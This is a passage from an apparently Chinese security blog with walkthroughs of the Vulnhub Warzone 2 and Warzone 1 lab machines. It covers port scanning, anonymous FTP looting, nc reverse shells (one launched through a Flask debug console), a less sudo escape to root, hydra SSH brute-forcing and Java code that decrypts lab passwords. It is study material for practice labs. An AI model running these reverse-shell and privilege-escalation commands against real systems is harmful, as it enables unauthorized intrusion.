+<p>2.再进行端口扫描，发现开放了21，22和1337端口，都是无法网页访问的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.129 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
+<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.129</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/5.png" alt="image"></p>
+<p>2.在&#x2F;anon目录下我们能发现username.PNG，password.PNG及token.PNG，全部获取到kali查看一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd anon</span><br><span class="line">ls -la</span><br><span class="line">get username.PNG</span><br><span class="line">get password.PNG</span><br><span class="line">get token.PNG</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/6.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-2/7.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-2/8.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-2/9.png" alt="image"></p>
+<p>3.在网络上查询旗语的指代，可以得到用户名为semaphore，密码为signalperson，然后进行sha256加密再转hex后得到token为833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26，可以远程链接1337端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.129 1337</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/10.png" alt="image"></p>
+<p>4.可以在kali开启对应的端口监听，获取shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.56.102 1234，靶机返回shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 1234，kali开启监听</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/11.png" alt="image"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.在&#x2F;flagman目录下我们能发现一个warzone2-socket-server目录，在其中的.mysshpassword文件可以发现flagman的ssh登录密码，可以登录到flagman：</p>
+<p><img src="/2023/12/11/Warzone-2/12.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-2/13.png" alt="image"></p>
+<p>2.在flagman用户下利用sudo -l命令能发现admiral用户能够执行wrz2-app.py，而flagman无权读写该文件：</p>
+<p><img src="/2023/12/11/Warzone-2/14.png" alt="image"></p>
+<p>3.运行wrz2-app.py发现程序在5000端口起了一个flask，并且开启了debug和输出了pin码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/15.png" alt="image"></p>
+<p>4.那么我们就要尝试在debug中获取反弹shell，获取用户admiral权限。由于监听在地址127.0.0.1，这里使用socat做了一个端口转发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:15000,reuseaddr,fork TCP4:127.0.0.1:5000</span><br><span class="line"></span><br><span class="line">sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py，再开启一个窗口链接flagman执行wrz2-app.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/16.png" alt="image"></p>
+<p>5.访问192.168.56.129:15000&#x2F;console，输入wrz2-app.py生成的PIN，构造shell，在kali开启对应端口监听，成功反弹：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;nc -e /bin/bash 192.168.56.102 9002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/17.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-2/18.png" alt="image"></p>
+<p>6.在&#x2F;home&#x2F;admiral&#x2F;Desktop目录下，我们能获得第一个flag，silver.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat silver.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/19.png" alt="image"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.再通过sudo -l命令，可以看到less可以执行特权命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/20.png" alt="image"></p>
+<p>2.那我们可以直接使用less进行提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/less /var/public/warzone-rules.txt</span><br><span class="line">:!id，在warzone-rules.txt编辑页输入</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/21.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-2/22.png" alt="image"></p>
+<p>3.成功提权到root，并可以在&#x2F;root&#x2F;Desktop下发现第二个flag，gold.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/less /var/public/warzone-rules.txt</span><br><span class="line">cat /root/Desktop/gold.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/23.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/11/Warzone-1/">
+                WARZONE 1
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2023
+    </time>
+    <section class="content">
+        <h1><span id="warzone-1">WARZONE: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称warzone-1">名称：Warzone: 1</span></h4><h4><span id="发布日期20201024">发布日期：2020.10.24</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>captain:&#x2F;~&#x2F;Desktop&#x2F;user.txt<br>root:&#x2F;root&#x2F;Desktop&#x2F;root.txt </p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名warzoneova">文件名：Warzone.ova</span></h4><h4><span id="文件大小22gb">文件大小：2.2GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzoneova">下载地址：</span></h4><h4><span id="md5-98fc0985c32a2380a0afbf24222c22d5">MD5: 98FC0985C32A2380A0AFBF24222C22D5</span></h4><h4><span id="sha1-0fb9dbc8d8516b462c4e1c8735d41b01d57f2b35">SHA1: 0FB9DBC8D8516B462C4E1C8735D41B01D57F2B35</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机warzone1和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2023/12/11/Warzone-1/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/2.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/3.png" alt="image"></p>
+<p>2.再进行端口扫描，发现开放了21，22和5000端口，访问5000端口，发现栅栏密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.128 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/4.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-1/5.png" alt="image"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;gobuster dir -u http://192.168.56.128:5000 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="页面信息获取">页面信息获取</span></h3><blockquote>
+<p>1.栅栏密码的原文应该是Its a warzone，加密后变成Iwotaaznsre，将源码中的字串解密（<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777%EF%BC%89%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%EF%BC%9A">http://www.atoolbox.net/Tool.php?Id=777）得到路径：</a></p>
+<p><img src="/2023/12/11/Warzone-1/7.png" alt="image"></p>
+<p>2.访问页面路径，得到8个用户及对应密码加密，加密字段无法用base64直接解开：</p>
+<p><img src="/2023/12/11/Warzone-1/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
+<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.128</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/9.png" alt="image"></p>
+<p>2.在&#x2F;pub目录下我们能发现note.txt，提示我们密码都是用warzone-encrypt.jar进行加密的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd pub</span><br><span class="line">ls -la</span><br><span class="line">get note.txt</span><br><span class="line">get warzone-encrypt.jar</span><br><span class="line">quit</span><br><span class="line">cat note.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/10.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-1/11.png" alt="image"></p>
+</blockquote>
+<h3><span id="jar加密算法反解">jar加密算法反解</span></h3><blockquote>
+<p>1.查看warzone-encrypt.jar，发现是用AES对密码进行加密的，这样的话我们依加密算法写出解密算法即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Main.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> encrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> Other.Obfuscated;</span><br><span class="line"><span class="keyword">import</span> crypto.AES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decrypt</span><span class="params">(String encryptpasswd)</span> &#123;</span><br><span class="line">       <span class="type">Obfuscated</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Obfuscated</span>();</span><br><span class="line">       <span class="type">AES</span> <span class="variable">ea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>(obs.getIV(), <span class="number">128</span>, obs.getKey());</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           ea.cipher.init(<span class="number">2</span>, ea.key, ea.iv);</span><br><span class="line">           <span class="type">byte</span>[] encryptbytes = Base64.getDecoder().decode(encryptpasswd);</span><br><span class="line">           <span class="type">byte</span>[] decryptbytes = ea.cipher.doFinal(encryptbytes);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decryptbytes);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">           System.out.print(<span class="string">&quot;enter the encryptpassword to decrypt : &quot;</span>);</span><br><span class="line">           <span class="type">String</span> <span class="variable">encryptpassword</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line">           System.out.println(<span class="string">&quot;password : &quot;</span> + decrypt(encryptpassword));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">AES.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> crypto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Other.Obfuscated;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AES</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">IvParameterSpec</span> <span class="variable">DEFAULT_IV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">19</span>]);</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM</span> <span class="operator">=</span> <span class="string">&quot;AES&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRANSFORMATION</span> <span class="operator">=</span> <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> Key key;</span><br><span class="line"> <span class="keyword">public</span> IvParameterSpec iv;</span><br><span class="line"> <span class="keyword">public</span> Cipher cipher;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>(key, <span class="number">128</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key, <span class="type">int</span> bit)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>(key, bit, <span class="literal">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key, <span class="type">int</span> bit, String iv)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (bit == <span class="number">256</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(getHash(<span class="string">&quot;SHA-256&quot;</span>, key), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(getHash(<span class="string">&quot;MD5&quot;</span>, key), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">if</span> (iv != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.iv = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(getHash(<span class="string">&quot;MD5&quot;</span>, iv));</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.iv = DEFAULT_IV;</span><br><span class="line">   &#125; </span><br><span class="line">   init();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getHash(String algorithm, String text) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> getHash(algorithm, text.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getHash(String algorithm, <span class="type">byte</span>[] data) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(algorithm);</span><br><span class="line">     digest.update(data);</span><br><span class="line">     <span class="keyword">return</span> digest.digest();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> encrypt(str.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.cipher.init(<span class="number">1</span>, <span class="built_in">this</span>.key, <span class="built_in">this</span>.iv);</span><br><span class="line">     <span class="type">byte</span>[] encryptData = <span class="built_in">this</span>.cipher.doFinal(data);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(encryptData));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptString</span><span class="params">(String content)</span> &#123;</span><br><span class="line">   <span class="type">Obfuscated</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Obfuscated</span>();</span><br><span class="line">   <span class="type">AES</span> <span class="variable">ea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>(obs.getIV(), <span class="number">128</span>, obs.getKey());</span><br><span class="line">   <span class="keyword">return</span> ea.encrypt(content);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Obfuscated.java</span><br><span class="line"><span class="keyword">package</span> Other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Obfuscated</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getIV</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;w4rz0n3s3cur31vv&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;w4rz0n3s3cur3k3y&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.将用户和加密后密码输入得到对应的用户及解密密码字典，利用hydra进行ssh爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.dic -P pass.dic ssh://192.168.56.128</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/12.png" alt="image"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.ssh登录commando用户，查看历史：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh commando@192.168.56.128</span><br><span class="line"></span><br><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/13.png" alt="image"></p>
+<p>2.可以发现&#x2F;home&#x2F;captain&#x2F;Desktop目录下有user.txt，但我们无权查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/captain/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/14.png" alt="image"></p>
+<p>3.在&#x2F;.crypt目录下能发现readme.txt，readme.txt提醒密码就在这里，还有一段加密程序encrypt.py和.c：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .crypt</span><br><span class="line">ls -la</span><br><span class="line">cat readme.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/15.png" alt="image"></p>
+<p>4.查看encrypt.py，.c和script.sh，我们能够知道script.sh是将参数输入encrypt.py后由encrypt.py加密生成.c中的字串，我们可以写一个解密程序，将captain用户的密码解密出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br><span class="line">cat .c</span><br><span class="line">cat script.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/16.png" alt="image"></p>
